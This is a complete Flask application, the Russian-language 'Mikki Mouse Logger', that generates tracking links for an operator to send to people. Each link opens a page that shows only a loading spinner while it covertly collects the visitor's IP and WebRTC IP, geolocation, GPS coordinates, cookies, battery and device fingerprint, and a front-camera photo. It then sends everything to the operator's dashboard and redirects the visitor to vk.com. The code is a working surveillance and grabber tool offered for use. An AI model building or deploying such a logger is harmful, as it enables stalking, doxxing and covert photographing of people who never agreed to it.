from flask import Flask, request, redirect, render_template_string, jsonify, session
import uuid
import datetime
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config['SESSION_COOKIE_SECURE'] = False

# ========== ХРАНИЛИЩА С ПРИВЯЗКОЙ К СЕССИИ ==========
user_data = {}

def get_user_data():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    user_id = session['user_id']
    if user_id not in user_data:
        user_data[user_id] = {'links': {}, 'logs': {}}
    return user_data[user_id]

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

# ===================== СТРАНИЦА-ЛОГГЕР =====================
LOGGER_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Mikki Mouse Logger</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            flex-direction: column;
            overflow: hidden;
        }
        .loader {
            width: 56px;
            height: 56px;
            border: 3px solid rgba(255,255,255,0.06);
            border-top: 3px solid #7c5cfc;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4,0,0.2,1) infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text {
            font-size: 14px;
            color: rgba(255,255,255,0.3);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 20px;
        }
        .mouse-icon {
            font-size: 48px;
            margin-bottom: 16px;
            animation: bounce 1.5s ease-in-out infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
    </style>
</head>
<body>
<div style="text-align:center;">
    <div class="mouse-icon">🐭</div>
    <div class="loader"></div>
    <div class="loader-text">Mikki Mouse Logger • Сбор данных...</div>
</div>

<script>
(async function() {
    const linkId = window.location.pathname.split('/').pop();
    
    let settings = { redirect: 'https://vk.com/', geo: true, camera: true };
    try {
        const res = await fetch('/settings');
        settings = await res.json();
    } catch(e) {}

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip || 'Unknown';
        } catch { return 'Unknown'; }
    }

    async function getGeo(ip) {
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await res.json();
            return {
                country: data.country_name || data.country || 'Unknown',
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                isp: data.org || 'Unknown',
                latitude: data.latitude || 'Unknown',
                longitude: data.longitude || 'Unknown'
            };
        } catch { return { country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown' }; }
    }

    function getDevice() {
        const ua = navigator.userAgent;
        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
        if (/Windows/i.test(ua)) os = 'Windows';
        else if (/Mac/i.test(ua)) os = 'macOS';
        else if (/Linux/i.test(ua)) os = 'Linux';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
        else if (/Firefox/i.test(ua)) browser = 'Firefox';
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
        else if (/Edg/i.test(ua)) browser = 'Edge';
        return { device, os, browser, ua };
    }

    function getScreen() {
        return {
            screen: `${window.screen.width}x${window.screen.height}`,
            window: `${window.innerWidth}x${window.innerHeight}`,
            colorDepth: window.screen.colorDepth || 'Unknown',
            pixelRatio: window.devicePixelRatio || 1
        };
    }

    function getWebRTC() {
        return new Promise(resolve => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('test');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
                        resolve(ip ? ip[0] : 'Unknown');
                        pc.close();
                    }
                };
                setTimeout(() => { resolve('Unknown'); pc.close(); }, 2000);
            } catch { resolve('Unknown'); }
        });
    }

    function getBattery() {
        return new Promise(resolve => {
            if (!navigator.getBattery) { resolve({ level: 'Unknown', charging: 'Unknown' }); return; }
            navigator.getBattery()
                .then(bat => resolve({ level: `${Math.round(bat.level * 100)}%`, charging: bat.charging ? 'Yes' : 'No' }))
                .catch(() => resolve({ level: 'Unknown', charging: 'Unknown' }));
        });
    }

    function getWebGL() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                return {
                    renderer: gl.getParameter(gl.RENDERER) || 'Unknown',
                    version: gl.getParameter(gl.VERSION) || 'Unknown'
                };
            }
            return { renderer: 'Not supported', version: 'Not supported' };
        } catch { return { renderer: 'Unknown', version: 'Unknown' }; }
    }

    function getGeolocation() {
        return new Promise(resolve => {
            if (!settings.geo || !navigator.geolocation) {
                resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: 'Disabled' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                err => resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: err.message }),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }

    function getCameraPhoto() {
        return new Promise(resolve => {
            if (!settings.camera) { resolve(null); return; }
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                    resolve(photo);
                }, 300);
            })
            .catch(() => resolve(null));
        });
    }

    function getFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('fp', 10, 10);
            ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
            return canvas.toDataURL().substring(0, 80) + '...';
        } catch { return 'Unknown'; }
    }

    function getPlugins() {
        try { return Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None'; }
        catch { return 'Unknown'; }
    }

    const ip = await getIP();
    const [geo, device, screen, webrtc, battery, webgl, geolocation, photo] = await Promise.all([
        getGeo(ip),
        getDevice(),
        getScreen(),
        getWebRTC(),
        getBattery(),
        getWebGL(),
        getGeolocation(),
        getCameraPhoto()
    ]);

    const data = {
        link_id: linkId,
        timestamp: new Date().toISOString(),
        ip: ip,
        webrtc_ip: webrtc,
        country: geo.country,
        city: geo.city,
        region: geo.region,
        isp: geo.isp,
        geo_lat: geo.latitude,
        geo_lon: geo.longitude,
        gps_lat: geolocation.latitude,
        gps_lon: geolocation.longitude,
        gps_accuracy: geolocation.accuracy,
        device_type: device.device,
        os: device.os,
        browser: device.browser,
        user_agent: device.ua,
        screen: screen.screen,
        window_size: screen.window,
        color_depth: screen.colorDepth,
        pixel_ratio: screen.pixelRatio,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language || 'Unknown',
        cookies: document.cookie || 'No cookies',
        fingerprint: getFingerprint(),
        plugins: getPlugins(),
        battery_level: battery.level,
        battery_charging: battery.charging,
        webgl_renderer: webgl.renderer,
        webgl_version: webgl.version,
        photo: photo,
        settings_used: settings
    };

    fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(() => {});

    setTimeout(() => {
        window.location.href = settings.redirect || 'https://vk.com/';
    }, 500);
})();
</script>
</body>
</html>
"""

# ===================== СТАТИСТИКА =====================
STATS_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mikki Mouse Logger</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e8edf5;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            padding: 24px;
            min-height: 100vh;
        }
        .app { max-width: 1280px; margin: 0 auto; }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 16px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .logo-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #7c5cfc, #5c3cfc);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .logo-text {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .logo-text span { color: #7c5cfc; }
        .logo-sub {
            font-size: 13px;
            color: rgba(255,255,255,0.3);
            font-weight: 400;
        }
        .header-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 22px;
            border: none;
            border-radius: 10px;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            color: #fff;
        }
        .btn:active { transform: scale(0.96); }
        .btn-primary { background: linear-gradient(135deg, #7c5cfc, #5c3cfc); box-shadow: 0 4px 20px rgba(124,92,252,0.3); }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 30px rgba(124,92,252,0.4); }
        .btn-success { background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 20px rgba(16,185,129,0.3); }
        .btn-success:hover { transform: translateY(-2px); }
        .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 20px rgba(239,68,68,0.3); }
        .btn-danger:hover { transform: translateY(-2px); }
        .btn-ghost { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.08); }
        .btn-ghost:hover { background: rgba(255,255,255,0.12); }
        .btn-sm { padding: 6px 14px; font-size: 12px; }
        .btn-xs { padding: 4px 10px; font-size: 11px; }
        .btn-settings { 
            background: rgba(124,92,252,0.15); 
            border: 1px solid rgba(124,92,252,0.3);
            color: #a78bfa;
        }
        .btn-settings:hover { background: rgba(124,92,252,0.25); }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 16px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            padding: 20px 24px;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }
        .stat-card:hover { border-color: rgba(124,92,252,0.3); }
        .stat-card .num {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #7c5cfc, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .stat-card .label {
            font-size: 13px;
            color: rgba(255,255,255,0.4);
            margin-top: 4px;
            font-weight: 400;
        }
        .link-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            transition: all 0.3s ease;
        }
        .link-box:hover { border-color: rgba(124,92,252,0.2); }
        .link-box .link {
            flex: 1;
            font-size: 14px;
            color: #a78bfa;
            word-break: break-all;
            font-weight: 500;
            font-family: monospace;
            min-width: 200px;
        }
        .link-box .meta {
            font-size: 12px;
            color: rgba(255,255,255,0.3);
            white-space: nowrap;
        }
        .link-box .actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        .visitor {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            padding: 16px 20px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }
        .visitor:hover { border-color: rgba(124,92,252,0.2); }
        .visitor .head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 6px;
        }
        .visitor .ip {
            color: #a78bfa;
            font-weight: 600;
            font-size: 15px;
        }
        .visitor .time {
            font-size: 12px;
            color: rgba(255,255,255,0.3);
        }
        .badge {
            display: inline-block;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
        }
        .badge-success { background: rgba(16,185,129,0.15); color: #34d399; }
        .badge-warning { background: rgba(245,158,11,0.15); color: #fbbf24; }
        .badge-danger { background: rgba(239,68,68,0.15); color: #f87171; }
        .badge-info { background: rgba(124,92,252,0.15); color: #a78bfa; }
        .visitor .detail {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
            line-height: 1.6;
        }
        .visitor .photo {
            max-width: 140px;
            border-radius: 8px;
            margin-top: 8px;
            border: 2px solid rgba(16,185,129,0.3);
        }
        .visitor .photo-placeholder {
            font-size: 12px;
            color: rgba(255,255,255,0.2);
            margin-top: 4px;
        }
        .settings-panel {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            padding: 24px 28px;
            margin-bottom: 30px;
            display: none;
        }
        .settings-panel.active { display: block; }
        .settings-panel .title {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        .settings-row {
            display: flex;
            flex-wrap: wrap;
            gap: 20px 40px;
            align-items: center;
        }
        .settings-group {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .settings-group label {
            font-size: 13px;
            color: rgba(255,255,255,0.6);
            cursor: pointer;
        }
        .settings-group input[type="text"] {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 8px;
            padding: 8px 14px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            min-width: 220px;
            outline: none;
        }
        .settings-group input[type="text"]:focus {
            border-color: #7c5cfc;
            box-shadow: 0 0 0 3px rgba(124,92,252,0.15);
        }
        .toggle {
            position: relative;
            width: 44px;
            height: 24px;
            background: rgba(255,255,255,0.1);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }
        .toggle.active { background: #7c5cfc; }
        .toggle .thumb {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 20px;
            height: 20px;
            background: #fff;
            border-radius: 50%;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }
        .toggle.active .thumb { left: 22px; }
        .settings-group .toggle-label {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
            min-width: 60px;
        }
        .settings-group .toggle-label.active { color: #a78bfa; }
        .empty {
            text-align: center;
            padding: 50px 20px;
            color: rgba(255,255,255,0.2);
        }
        .empty .icon { font-size: 48px; margin-bottom: 16px; opacity: 0.3; }
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(16,185,129,0.15);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(16,185,129,0.2);
            color: #34d399;
            padding: 12px 28px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 500;
            opacity: 0;
            transition: all 0.4s ease;
            pointer-events: none;
            z-index: 999;
        }
        .toast.show { opacity: 1; }
        .toast.error { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.2); color: #f87171; }
        .mouse-icon { font-size: 32px; margin-right: 8px; }
        @media (max-width: 768px) {
            body { padding: 16px; }
            .header { flex-direction: column; align-items: flex-start; }
            .header-actions { width: 100%; }
            .header-actions .btn { flex: 1; justify-content: center; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .settings-row { flex-direction: column; align-items: stretch; }
            .settings-group input[type="text"] { min-width: 100%; }
            .link-box { flex-direction: column; align-items: stretch; }
            .link-box .actions { justify-content: flex-end; }
        }
    </style>
</head>
<body>
<div class="app">
    <header class="header">
        <div class="logo">
            <div class="logo-icon">🐭</div>
            <div>
                <div class="logo-text">Mikki <span>Mouse</span> Logger</div>
                <div class="logo-sub">Приватные ссылки</div>
            </div>
        </div>
        <div class="header-actions">
            <button class="btn btn-primary" onclick="generateLink()">➕ Создать</button>
            <button class="btn btn-success" onclick="copyLink()">📋 Копировать</button>
            <button class="btn btn-settings" onclick="toggleSettings()">⚙️ Настройки</button>
            <button class="btn btn-danger" onclick="clearAll()">🗑️ Очистить</button>
            <button class="btn btn-ghost" onclick="exportAll()">📥 Экспорт</button>
        </div>
    </header>

    <div class="settings-panel" id="settingsPanel">
        <div class="title">⚙️ Настройки</div>
        <div class="settings-row">
            <div class="settings-group" style="flex:2;">
                <label>🔗 Редирект</label>
                <input type="text" id="redirectInput" placeholder="https://vk.com/" value="https://vk.com/" />
                <button class="btn btn-sm btn-ghost" onclick="saveSettings()">💾 Сохранить</button>
            </div>
            <div class="settings-group">
                <span class="toggle-label" id="geoLabel">📍 Гео</span>
                <div class="toggle active" id="geoToggle" onclick="toggleSetting('geo')">
                    <div class="thumb"></div>
                </div>
            </div>
            <div class="settings-group">
                <span class="toggle-label" id="cameraLabel">📷 Камера</span>
                <div class="toggle active" id="cameraToggle" onclick="toggleSetting('camera')">
                    <div class="thumb"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="stats-grid" id="statsGrid">
        <div class="stat-card"><div class="num" id="totalVisits">0</div><div class="label">Всего переходов</div></div>
        <div class="stat-card"><div class="num" id="uniqueVisits">0</div><div class="label">Уникальных IP</div></div>
        <div class="stat-card"><div class="num" id="withPhoto">0</div><div class="label">С фото</div></div>
        <div class="stat-card"><div class="num" id="withGeo">0</div><div class="label">С геолокацией</div></div>
    </div>

    <div id="currentLinkBox" style="display:none;">
        <div class="link-box" style="border-color: rgba(124,92,252,0.3);">
            <span class="link" id="currentLinkText"></span>
            <span class="meta" id="currentVisits">0 переходов</span>
            <div class="actions">
                <button class="btn btn-sm btn-success" onclick="copyLink()">📋</button>
                <button class="btn btn-sm btn-danger" onclick="deleteCurrentLink()">✕</button>
            </div>
        </div>
    </div>

    <div id="linksList"></div>
    <div id="visitorsList"></div>
</div>

<div class="toast" id="toast"></div>

<script>
let currentLinkId = null;
let currentFullLink = '';
let settings = { redirect: 'https://vk.com/', geo: true, camera: true };

fetch('/settings')
    .then(r => r.json())
    .then(data => {
        settings = data;
        document.getElementById('redirectInput').value = data.redirect || 'https://vk.com/';
        updateToggle('geo', data.geo !== false);
        updateToggle('camera', data.camera !== false);
    })
    .catch(() => {});

function toggleSettings() {
    document.getElementById('settingsPanel').classList.toggle('active');
}

function toggleSetting(name) {
    settings[name] = !settings[name];
    updateToggle(name, settings[name]);
    saveSettings();
}

function updateToggle(name, value) {
    const el = document.getElementById(name + 'Toggle');
    const label = document.getElementById(name + 'Label');
    if (value) {
        el.classList.add('active');
        if (label) label.classList.add('active');
    } else {
        el.classList.remove('active');
        if (label) label.classList.remove('active');
    }
}

function saveSettings() {
    const redirect = document.getElementById('redirectInput').value.trim() || 'https://vk.com/';
    settings.redirect = redirect;
    fetch('/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
    })
    .then(() => showToast('✅ Настройки сохранены'))
    .catch(() => showToast('❌ Ошибка', true));
}

function generateLink() {
    fetch('/generate')
        .then(r => r.json())
        .then(data => {
            currentLinkId = data.id;
            currentFullLink = data.full_url;
            document.getElementById('currentLinkBox').style.display = 'block';
            document.getElementById('currentLinkText').textContent = currentFullLink;
            document.getElementById('currentVisits').textContent = data.visits + ' переходов';
            loadLinks();
            loadStats();
            showToast('✅ Ссылка создана');
        });
}

function copyLink() {
    if (!currentFullLink) { generateLink(); return; }
    navigator.clipboard.writeText(currentFullLink).then(() => {
        showToast('📋 Ссылка скопирована');
    });
}

function deleteCurrentLink() {
    if (!currentLinkId) return;
    if (!confirm('Удалить эту ссылку?')) return;
    fetch('/delete/' + currentLinkId, { method: 'POST' })
        .then(() => {
            currentLinkId = null;
            currentFullLink = '';
            document.getElementById('currentLinkBox').style.display = 'none';
            loadLinks();
            loadStats();
            showToast('🗑️ Ссылка удалена');
        });
}

function loadLinks() {
    fetch('/links')
        .then(r => r.json())
        .then(data => {
            const container = document.getElementById('linksList');
            if (data.links.length === 0) {
                container.innerHTML = `<div class="empty"><div class="icon">🐭</div><div class="text">Нет созданных ссылок</div></div>`;
                return;
            }
            let html = '<div style="margin:20px 0 12px 0; font-size:14px; font-weight:500; color:rgba(255,255,255,0.4);">📋 Ваши ссылки</div>';
            data.links.forEach(link => {
                const visits = data.visits[link.id] || 0;
                html += `<div class="link-box">
                    <span class="link">${link.full_url}</span>
                    <span class="meta">${visits} переходов</span>
                    <div class="actions">
                        <button class="btn btn-xs btn-primary" onclick="selectLink('${link.id}')">Выбрать</button>
                        <button class="btn btn-xs btn-danger" onclick="deleteLink('${link.id}')">✕</button>
                    </div>
                </div>`;
            });
            container.innerHTML = html;
        });
}

function selectLink(id) {
    fetch('/links')
        .then(r => r.json())
        .then(data => {
            const link = data.links.find(l => l.id === id);
            if (link) {
                currentLinkId = link.id;
                currentFullLink = link.full_url;
                document.getElementById('currentLinkBox').style.display = 'block';
                document.getElementById('currentLinkText').textContent = currentFullLink;
                document.getElementById('currentVisits').textContent = (data.visits[id] || 0) + ' переходов';
                loadStats();
                showToast('✅ Ссылка выбрана');
            }
        });
}

function deleteLink(id) {
    if (!confirm('Удалить эту ссылку?')) return;
    fetch('/delete/' + id, { method: 'POST' })
        .then(() => {
            if (currentLinkId === id) {
                currentLinkId = null;
                currentFullLink = '';
                document.getElementById('currentLinkBox').style.display = 'none';
            }
            loadLinks();
            loadStats();
            showToast('🗑️ Ссылка удалена');
        });
}

function loadStats() {
    const url = currentLinkId ? '/stats/' + currentLinkId : '/stats/all';
    fetch(url)
        .then(r => r.json())
        .then(data => {
            document.getElementById('totalVisits').textContent = data.total_visits || 0;
            document.getElementById('uniqueVisits').textContent = data.unique_ips || 0;
            document.getElementById('withPhoto').textContent = data.with_photo || 0;
            document.getElementById('withGeo').textContent = data.with_geo || 0;

            if (currentLinkId && document.getElementById('currentVisits')) {
                document.getElementById('currentVisits').textContent = (data.total_visits || 0) + ' переходов';
            }

            let html = '';
            const visitors = data.visitors || [];
            if (visitors.length === 0) {
                html = `<div class="empty"><div class="icon">🐭</div><div class="text">Пока никого нет</div></div>`;
            } else {
                visitors.forEach(v => {
                    const hasPhoto = v.photo && v.photo.length > 100;
                    html += `<div class="visitor">
                        <div class="head">
                            <span class="ip">${v.ip || 'Unknown'}</span>
                            <span class="time">${v.timestamp || ''}</span>
                        </div>
                        <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:6px;">
                            ${v.country ? `<span class="badge badge-success">${v.country}</span>` : ''}
                            ${v.city ? `<span class="badge badge-info">${v.city}</span>` : ''}
                            ${v.gps_lat && v.gps_lat !== 'Denied' ? `<span class="badge badge-warning">📍 GPS</span>` : ''}
                            ${hasPhoto ? `<span class="badge badge-success">📸 Фото</span>` : ''}
                            ${v.gps_lat === 'Denied' ? `<span class="badge badge-danger">❌ Гео отказ</span>` : ''}
                        </div>
                        <div class="detail">📱 ${v.device_type || 'Unknown'} · ${v.os || 'Unknown'} · ${v.browser || 'Unknown'}</div>
                        <div class="detail">🖥️ ${v.screen || 'Unknown'} · ⏰ ${v.timezone || 'Unknown'}</div>
                        <div class="detail">🔋 ${v.battery_level || 'Unknown'} · ${v.battery_charging === 'Yes' ? '🔌 зарядка' : '🔋 не заряжается'}</div>
                        ${hasPhoto ? `<img src="${v.photo}" class="photo" />` : '<div class="photo-placeholder">📷 Фото не получено</div>'}
                    </div>`;
                });
            }
            document.getElementById('visitorsList').innerHTML = html;
        });
}

function clearAll() {
    if (!confirm('Удалить все свои данные?')) return;
    fetch('/clear', { method: 'POST' })
        .then(() => {
            currentLinkId = null;
            currentFullLink = '';
            document.getElementById('currentLinkBox').style.display = 'none';
            loadLinks();
            loadStats();
            showToast('🗑️ Всё очищено');
        });
}

function exportAll() {
    window.open('/export', '_blank');
}

function showToast(msg, isError = false) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = 'toast show' + (isError ? ' error' : '');
    clearTimeout(toast._hide);
    toast._hide = setTimeout(() => toast.classList.remove('show'), 3000);
}

setInterval(() => { loadStats(); loadLinks(); }, 5000);

loadLinks();
loadStats();
setTimeout(generateLink, 600);
</script>
</body>
</html>
"""

# ===================== МАРШРУТЫ =====================

@app.route('/')
def index():
    return render_template_string(STATS_HTML)

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if request.method == 'POST':
        data = request.get_json()
        session['settings'] = data
        return jsonify({'status': 'ok'})
    return jsonify(session.get('settings', {
        'redirect': 'https://vk.com/',
        'geo': True,
        'camera': True
    }))

@app.route('/generate')
def generate():
    user = get_user_data()
    link_id = str(uuid.uuid4())[:8]
    user['links'][link_id] = {'created': datetime.datetime.now().isoformat()}
    user['logs'][link_id] = []
    return jsonify({
        'id': link_id,
        'full_url': f"{request.host_url}l/{link_id}",
        'visits': 0
    })

@app.route('/l/<link_id>')
def logger(link_id):
    exists = any(link_id in data['links'] for data in user_data.values())
    if not exists:
        return 'Ссылка не найдена', 404
    return render_template_string(LOGGER_HTML)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    link_id = data.get('link_id')
    for user_id, user in user_data.items():
        if link_id in user['logs']:
            user['logs'][link_id].append(data)
            break
    return jsonify({'status': 'ok'})

@app.route('/links')
def get_links():
    user = get_user_data()
    links = []
    for link_id in user['links']:
        links.append({
            'id': link_id,
            'full_url': f"{request.host_url}l/{link_id}",
            'created': user['links'][link_id]['created']
        })
    visits = {}
    for link_id, logs in user['logs'].items():
        visits[link_id] = len(logs)
    return jsonify({'links': links, 'visits': visits})

@app.route('/stats/all')
def stats_all():
    user = get_user_data()
    all_visitors = []
    for visitors in user['logs'].values():
        all_visitors.extend(visitors)

    unique_ips = len(set(v.get('ip') for v in all_visitors if v.get('ip')))
    with_photo = sum(1 for v in all_visitors if v.get('photo'))
    with_geo = sum(1 for v in all_visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')

    return jsonify({
        'visitors': all_visitors[-50:],
        'total_visits': len(all_visitors),
        'unique_ips': unique_ips,
        'with_photo': with_photo,
        'with_geo': with_geo
    })

@app.route('/stats/<link_id>')
def stats_link(link_id):
    user = get_user_data()
    visitors = user['logs'].get(link_id, [])
    unique_ips = len(set(v.get('ip') for v in visitors if v.get('ip')))
    with_photo = sum(1 for v in visitors if v.get('photo'))
    with_geo = sum(1 for v in visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')

    return jsonify({
        'visitors': visitors[-50:],
        'total_visits': len(visitors),
        'unique_ips': unique_ips,
        'with_photo': with_photo,
        'with_geo': with_geo
    })

@app.route('/delete/<link_id>', methods=['POST'])
def delete_link(link_id):
    user = get_user_data()
    if link_id in user['links']:
        del user['links'][link_id]
    if link_id in user['logs']:
        del user['logs'][link_id]
    return jsonify({'status': 'ok'})

@app.route('/clear', methods=['POST'])
def clear():
    user = get_user_data()
    user['links'].clear()
    user['logs'].clear()
    return jsonify({'status': 'ok'})

@app.route('/export')
def export():
    user = get_user_data()
    return jsonify({
        'links': user['links'],
        'logs': user['logs']
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
